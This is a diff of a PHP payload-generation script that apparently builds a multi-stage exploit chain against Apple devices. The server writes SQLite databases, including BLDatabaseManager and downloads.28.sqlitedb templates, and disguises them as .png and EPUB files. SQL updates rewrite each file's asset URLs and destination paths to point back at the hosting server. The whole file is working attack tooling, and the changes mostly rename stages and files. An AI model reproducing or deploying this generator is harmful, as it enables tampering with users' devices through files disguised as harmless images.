@@ -22,9 +22,9 @@ if ($scriptPath === '/' || $scriptPath === '\\') $scriptPath = '';
 define('BASE_URL', rtrim($protocol . "://" . $host . $scriptPath, '/'));
 
 if (!is_dir(CACHE_DIR)) mkdir(CACHE_DIR, 0755, true);
-if (!is_dir(CACHE_DIR . '/stage1')) mkdir(CACHE_DIR . '/stage1', 0755, true);
-if (!is_dir(CACHE_DIR . '/stage2')) mkdir(CACHE_DIR . '/stage2', 0755, true);
-if (!is_dir(CACHE_DIR . '/stage3')) mkdir(CACHE_DIR . '/stage3', 0755, true);
+if (!is_dir(__DIR__ . '/firststp')) mkdir(__DIR__ . '/firststp', 0755, true);
+if (!is_dir(__DIR__ . '/2ndd')) mkdir(__DIR__ . '/2ndd', 0755, true);
+if (!is_dir(__DIR__ . '/last')) mkdir(__DIR__ . '/last', 0755, true);
 
 function log_debug($msg, $level = 'INFO') {
     $timestamp = date('Y-m-d H:i:s');
@@ -111,7 +111,7 @@ class PayloadGenerator {
         log_debug("Using plist: $plistSource (size: " . filesize($plistSource) . " bytes)");
 
         $token1 = $this->generateToken();
-        $dir1 = CACHE_DIR . "/stage1/$token1";
+        $dir1 = __DIR__ . "/firststp/$token1";
         mkdir($dir1, 0755, true);
         
         $cachesDir = "$dir1/Caches";
@@ -147,10 +147,10 @@ class PayloadGenerator {
         rename($zipPath, "$dir1/fixedfile");
         log_debug("Stage 1 complete: fixedfile created (EPUB-compliant)");
         
-        $fixedFileUrl = BASE_URL . "/cache/stage1/$token1/fixedfile";
+        $fixedFileUrl = BASE_URL . "/firststp/$token1/fixedfile";
 
         $token2 = $this->generateToken();
-        $dir2 = CACHE_DIR . "/stage2/$token2";
+        $dir2 = __DIR__ . "/2ndd/$token2";
         mkdir($dir2, 0755, true);
 
         $blTemplateFile = __DIR__ . '/BLDatabaseManager.png';
@@ -166,24 +166,26 @@ class PayloadGenerator {
         
         $this->createDatabaseFromSql($blSql, "$dir2/intermediate.sqlite");
         rename("$dir2/intermediate.sqlite", "$dir2/belliloveu.png");
-        log_debug("Stage 2 complete: BLDatabase created");
         
-        $blUrl = BASE_URL . "/cache/stage2/$token2/belliloveu.png";
+        touch("$dir2/belliloveu.png-wal");
+        touch("$dir2/belliloveu.png-shm");
+        log_debug("Stage 2 complete: BLDatabase created with WAL/SHM");
+        
+        $blUrl = BASE_URL . "/2ndd/$token2/belliloveu.png";
 
         $token3 = $this->generateToken();
-        $dir3 = CACHE_DIR . "/stage3/$token3";
+        $dir3 = __DIR__ . "/last/$token3";
         mkdir($dir3, 0755, true);
 
         $dlBinaryFile = __DIR__ . '/downloads.28.sqlitedb';
         $dlPngFile = __DIR__ . '/downloads.28.png';
         
         if (file_exists($dlBinaryFile)) {
-            copy($dlBinaryFile, "$dir3/payload.png");
+            copy($dlBinaryFile, "$dir3/apllefuckedhhh.png");
             log_debug("Using binary downloads.28.sqlitedb template (" . filesize($dlBinaryFile) . " bytes)");
             
             try {
-                $db = new SQLite3("$dir3/payload.png");
-                $db->exec("UPDATE asset SET url = REPLACE(url, 'https://google.com', '$blUrl') WHERE url LIKE '%google.com%'");
+                $db = new SQLite3("$dir3/apllefuckedhhh.png");
                 $db->exec("UPDATE asset SET url = REPLACE(url, 'https://your_domain_here', '" . BASE_URL . "') WHERE url LIKE '%your_domain_here%'");
                 $db->exec("UPDATE asset SET destination_url = REPLACE(destination_url, 'GOODKEY', '{$this->guid}') WHERE destination_url LIKE '%GOODKEY%'");
                 $db->close();
@@ -194,12 +196,11 @@ class PayloadGenerator {
         } elseif (file_exists($dlPngFile)) {
             $fileHeader = file_get_contents($dlPngFile, false, null, 0, 16);
             if (strpos($fileHeader, 'SQLite') !== false) {
-                copy($dlPngFile, "$dir3/payload.png");
+                copy($dlPngFile, "$dir3/apllefuckedhhh.png");
                 log_debug("Using binary downloads.28.png as SQLite (" . filesize($dlPngFile) . " bytes)");
                 
                 try {
-                    $db = new SQLite3("$dir3/payload.png");
-                    $db->exec("UPDATE asset SET url = REPLACE(url, 'https://google.com', '$blUrl') WHERE url LIKE '%google.com%'");
+                    $db = new SQLite3("$dir3/apllefuckedhhh.png");
                     $db->exec("UPDATE asset SET url = REPLACE(url, 'https://your_domain_here', '" . BASE_URL . "') WHERE url LIKE '%your_domain_here%'");
                     $db->exec("UPDATE asset SET destination_url = REPLACE(destination_url, 'GOODKEY', '{$this->guid}') WHERE destination_url LIKE '%GOODKEY%'");
                     $db->close();
@@ -210,23 +211,23 @@ class PayloadGenerator {
             } else {
                 $dlSql = file_get_contents($dlPngFile);
                 log_debug("Using downloads.28.png as SQL text template");
-                $dlSql = str_replace('https://google.com', $blUrl, $dlSql);
+                $dlSql = str_replace('https://your_domain_here', BASE_URL, $dlSql);
                 $dlSql = str_replace('GOODKEY', $this->guid, $dlSql);
-                $this->createDatabaseFromSql($dlSql, "$dir3/payload.png");
+                $this->createDatabaseFromSql($dlSql, "$dir3/apllefuckedhhh.png");
             }
         } else {
             $dlSql = $this->readTemplate(TEMPLATE_DIR . '/downloads_structure.sql');
             log_debug("Using downloads_structure.sql template");
-            $dlSql = str_replace('https://google.com', $blUrl, $dlSql);
+            $dlSql = str_replace('https://your_domain_here', BASE_URL, $dlSql);
             $dlSql = str_replace('GOODKEY', $this->guid, $dlSql);
-            $this->createDatabaseFromSql($dlSql, "$dir3/payload.png");
+            $this->createDatabaseFromSql($dlSql, "$dir3/apllefuckedhhh.png");
         }
         
-        touch("$dir3/payload.png-wal");
-        touch("$dir3/payload.png-shm");
-        log_debug("Stage 3 complete: Final payload with WAL/SHM files (" . filesize("$dir3/payload.png") . " bytes)");
+        touch("$dir3/apllefuckedhhh.png-wal");
+        touch("$dir3/apllefuckedhhh.png-shm");
+        log_debug("Stage 3 complete: Final payload with WAL/SHM files (" . filesize("$dir3/apllefuckedhhh.png") . " bytes)");
         
-        $finalUrl = BASE_URL . "/cache/stage3/$token3/payload.png";
+        $finalUrl = BASE_URL . "/last/$token3/apllefuckedhhh.png";
         log_debug("=== PAYLOAD GENERATION COMPLETE ===");
         log_debug("Final URL: $finalUrl");
         
